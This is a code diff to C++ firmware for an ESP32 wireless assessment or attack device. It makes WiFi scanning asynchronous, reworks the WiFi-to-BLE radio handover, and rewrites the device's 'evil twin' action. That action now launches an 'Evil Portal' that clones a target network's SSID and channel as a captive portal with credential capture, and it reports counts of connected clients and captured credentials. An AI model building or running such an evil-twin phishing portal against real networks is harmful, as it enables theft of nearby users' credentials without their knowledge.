@@ -6,6 +6,7 @@
 #include "AssessorEngine.h"
 #include "../adapters/BruceWiFi.h"
 #include "../adapters/BruceBLE.h"
+#include "../adapters/EvilPortal.h"
 #include <WiFi.h>
 
 namespace Assessor {
@@ -88,10 +89,56 @@ void AssessorEngine::shutdown() {
 }
 
 void AssessorEngine::tick() {
-    // WiFi scanning is now SYNCHRONOUS - no tick needed
-    // (scan completes in beginScan/beginWiFiScan before returning)
+    // Handle ASYNC WiFi scanning
+    if (m_scanState == ScanState::WIFI_SCANNING) {
+        // Check if async scan is complete
+        int16_t scanResult = WiFi.scanComplete();
 
-    // Handle BLE scanning (still async via NimBLE)
+        if (scanResult == WIFI_SCAN_RUNNING) {
+            // Still scanning - update progress based on elapsed time
+            uint32_t elapsed = millis() - m_scanStartMs;
+            // Assume ~5 seconds for full scan, cap at 45% for WiFi portion
+            m_scanProgress = min(45, (int)(elapsed / 110));
+        }
+        else if (scanResult == WIFI_SCAN_FAILED) {
+            if (Serial) {
+                Serial.println("[WiFi] Scan failed!");
+            }
+            // Try to continue to BLE if combined scan
+            if (m_combinedScan) {
+                processScanResults(0);  // Will chain to BLE
+            } else {
+                m_scanState = ScanState::COMPLETE;
+                m_scanProgress = 100;
+            }
+        }
+        else if (scanResult >= 0) {
+            // Scan complete with results
+            if (Serial) {
+                Serial.printf("[WiFi] Async scan complete: %d networks\n", scanResult);
+            }
+            processScanResults(scanResult);
+        }
+
+        // Safety timeout - 10 seconds max for WiFi scan
+        uint32_t elapsed = millis() - m_scanStartMs;
+        if (elapsed > 10000 && m_scanState == ScanState::WIFI_SCANNING) {
+            if (Serial) {
+                Serial.println("[WiFi] Scan timeout, forcing complete");
+            }
+            int16_t partialResult = WiFi.scanComplete();
+            if (partialResult > 0) {
+                processScanResults(partialResult);
+            } else if (m_combinedScan) {
+                processScanResults(0);
+            } else {
+                m_scanState = ScanState::COMPLETE;
+                m_scanProgress = 100;
+            }
+        }
+    }
+
+    // Handle BLE scanning (async via NimBLE)
     if (m_scanState == ScanState::BLE_SCANNING) {
         BruceBLE& ble = BruceBLE::getInstance();
         ble.tick();
@@ -104,9 +151,7 @@ void AssessorEngine::tick() {
             if (timedOut && Serial) {
                 Serial.println("[BLE] Scan timed out, forcing complete");
             }
-            // Force stop the scanner
             ble.stopScan();
-            // Process BLE results into targets
             processBLEScanResults();
         }
         else {
@@ -156,26 +201,14 @@ void AssessorEngine::beginScan() {
     m_combinedScan = true;  // Will chain to BLE after WiFi
 
     if (Serial) {
-        Serial.println("[WiFi] Running SYNCHRONOUS scan...");
+        Serial.println("[WiFi] Starting ASYNC scan...");
     }
 
-    // Use SYNCHRONOUS scan - blocks but more reliable
-    int count = WiFi.scanNetworks(false, true, false, 300);  // async=FALSE
+    // Use ASYNC scan - non-blocking, check in tick()
+    // Parameters: async=true, show_hidden=true, passive=false, max_ms=300ms per channel
+    WiFi.scanNetworks(true, true, false, 300);
 
-    if (Serial) {
-        Serial.printf("[WiFi] Sync scan returned: %d networks\n", count);
-    }
-
-    if (count > 0) {
-        // Process results - this will chain to BLE if m_combinedScan is true
-        processScanResults(count);
-    } else {
-        if (Serial) {
-            Serial.println("[WiFi] No networks, skipping to BLE...");
-        }
-        // Still try BLE even if WiFi found nothing
-        processScanResults(0);
-    }
+    m_scanState = ScanState::WIFI_SCANNING;
 
     if (m_onScanProgress) {
         m_onScanProgress(m_scanState, m_scanProgress);
@@ -208,26 +241,13 @@ void AssessorEngine::beginWiFiScan() {
     m_combinedScan = false;  // WiFi only
 
     if (Serial) {
-        Serial.println("[WiFi] Running SYNCHRONOUS scan...");
+        Serial.println("[WiFi] Starting ASYNC scan...");
     }
 
-    // Use SYNCHRONOUS scan - blocks but more reliable
-    int count = WiFi.scanNetworks(false, true, false, 300);  // async=FALSE
+    // Use ASYNC scan - non-blocking, check in tick()
+    WiFi.scanNetworks(true, true, false, 300);
 
-    if (Serial) {
-        Serial.printf("[WiFi] Sync scan returned: %d networks\n", count);
-    }
-
-    if (count > 0) {
-        // Process results immediately
-        processScanResults(count);
-    } else {
-        if (Serial) {
-            Serial.println("[WiFi] No networks found or scan failed");
-        }
-        m_scanState = ScanState::COMPLETE;
-        m_scanProgress = 100;
-    }
+    m_scanState = ScanState::WIFI_SCANNING;
 
     if (m_onScanProgress) {
         m_onScanProgress(m_scanState, m_scanProgress);
@@ -373,42 +393,39 @@ void AssessorEngine::processScanResults(int count) {
             Serial.println("[Scan] WiFi done, preparing BLE...");
         }
 
-        // CRITICAL: Allow radio to fully transition from WiFi to BLE
-        // Feed watchdog aggressively during transition
-        for (int i = 0; i < 20; i++) {
-            yield();
-            delay(10);
-        }
+        // Shut down WiFi before starting BLE (ESP32 shares radio)
+        WiFi.disconnect(true);
+        WiFi.mode(WIFI_OFF);
+        delay(200);  // Brief transition delay
 
         BruceBLE& ble = BruceBLE::getInstance();
-
-        // Reset BLE state to force clean init
         ble.shutdown();
+        delay(100);
 
-        // More watchdog feeding
-        for (int i = 0; i < 10; i++) {
-            yield();
-            delay(10);
-        }
-
-        // Try BLE init with proper watchdog feeding between attempts
+        // Try BLE init with retries
         bool bleInitOk = false;
-        for (int attempt = 0; attempt < 2; attempt++) {
-            for (int i = 0; i < 5; i++) { yield(); delay(10); }
+        for (int attempt = 0; attempt < 3; attempt++) {
+            if (Serial) {
+                Serial.printf("[BLE] Init attempt %d...\n", attempt + 1);
+            }
 
             bleInitOk = ble.init();
-            if (bleInitOk) break;
+            if (bleInitOk) {
+                if (Serial) {
+                    Serial.println("[BLE] Init success!");
+                }
+                break;
+            }
 
             if (Serial) {
                 Serial.printf("[BLE] Init attempt %d failed\n", attempt + 1);
             }
-
-            for (int i = 0; i < 10; i++) { yield(); delay(10); }
+            delay(100);  // Wait before retry
         }
 
         if (!bleInitOk) {
             if (Serial) {
-                Serial.println("[BLE] Init failed, completing without BLE");
+                Serial.println("[BLE] Init failed after retries, completing without BLE");
             }
             m_scanState = ScanState::COMPLETE;
             m_scanProgress = 100;
@@ -635,20 +652,27 @@ bool AssessorEngine::executeAction(ActionType action, const Target& target) {
         }
 
         case ActionType::EVIL_TWIN: {
-            if (!wifi.init()) {
+            // Use the new Evil Portal (full captive portal with credential capture)
+            EvilPortal& portal = EvilPortal::getInstance();
+
+            m_actionProgress.statusText = "Starting evil portal...";
+
+            // Stop any existing portal first
+            if (portal.isRunning()) {
+                portal.stop();
+            }
+
+            // Start with generic template (could add template selection later)
+            bool success = portal.start(target.ssid, target.channel, PortalTemplate::GENERIC_WIFI);
+            if (!success) {
                 m_actionProgress.result = ActionResult::FAILED_HARDWARE;
-                m_actionProgress.statusText = "WiFi init failed";
+                m_actionProgress.statusText = "Portal failed to start";
                 m_actionActive = false;
                 return false;
             }
 
-            m_actionProgress.statusText = "Starting evil twin...";
-            bool success = wifi.startEvilTwin(target.ssid, target.channel, true);
-            if (!success) {
-                m_actionProgress.result = ActionResult::FAILED_NOT_SUPPORTED;
-                m_actionProgress.statusText = "Evil twin not ready";
-                m_actionActive = false;
-                return false;
+            if (Serial) {
+                Serial.printf("[Attack] Evil Portal started: %s\n", target.ssid);
             }
             return true;
         }
@@ -688,6 +712,12 @@ void AssessorEngine::stopAction() {
     BruceBLE& ble = BruceBLE::getInstance();
     ble.stopAttack();
 
+    // Stop Evil Portal if running
+    EvilPortal& portal = EvilPortal::getInstance();
+    if (portal.isRunning()) {
+        portal.stop();
+    }
+
     m_actionActive = false;
     m_actionProgress.result = ActionResult::CANCELLED;
     m_actionProgress.statusText = "Stopped";
@@ -718,6 +748,26 @@ void AssessorEngine::tickAction() {
     // Also tick BLE for BLE attacks
     BruceBLE& ble = BruceBLE::getInstance();
     ble.tick();
+
+    // Tick Evil Portal if running
+    EvilPortal& portal = EvilPortal::getInstance();
+    if (portal.isRunning()) {
+        portal.tick();
+
+        // Update status with credential count
+        size_t credCount = portal.getCredentialCount();
+        int clientCount = portal.getClientCount();
+        if (credCount > 0) {
+            static char statusBuf[48];
+            snprintf(statusBuf, sizeof(statusBuf), "Portal: %d clients, %d creds",
+                     clientCount, (int)credCount);
+            m_actionProgress.statusText = statusBuf;
+        } else {
+            static char statusBuf[32];
+            snprintf(statusBuf, sizeof(statusBuf), "Portal: %d clients", clientCount);
+            m_actionProgress.statusText = statusBuf;
+        }
+    }
 
     // Update progress from either WiFi or BLE
     uint32_t wifiPackets = wifi.getPacketsSent();
